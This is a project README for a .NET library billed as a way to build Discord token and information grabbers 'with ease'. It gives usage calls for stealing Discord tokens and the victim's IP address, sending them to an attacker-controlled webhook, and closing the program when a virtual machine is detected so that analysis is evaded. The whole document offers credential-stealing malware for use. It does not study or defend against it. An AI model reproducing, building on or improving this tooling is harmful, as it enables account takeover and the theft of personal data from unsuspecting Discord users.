# Discord-Token-Grabber-Library
A .NET library developed to create Discord token and other information grabbers with ease.

# Usage
Replace all occurances of "webhook-here" to your own server's webhook URL, this is the webhook which will be displaying the captured tokens.

Build the DLL and reference it in your project(s): ```using Furious;```

#### To grab tokens call
```Furious.Grabber.Start();```
#### To grab tokens + IP address
```Furious.Grabber.Start(true);```
#### To check for a VM before attempting to grab anything
```Furious.Grabber.Start(grabIP: true, checkForVM: true);``` - if a VM is detected, the application will close instantly.


# Requests
I do not know JS, I got it to work with luck, for those that do, the JS in the text files may look extremely messy. If you're able to optimise/clean-up the code I would greatly appreciate it.
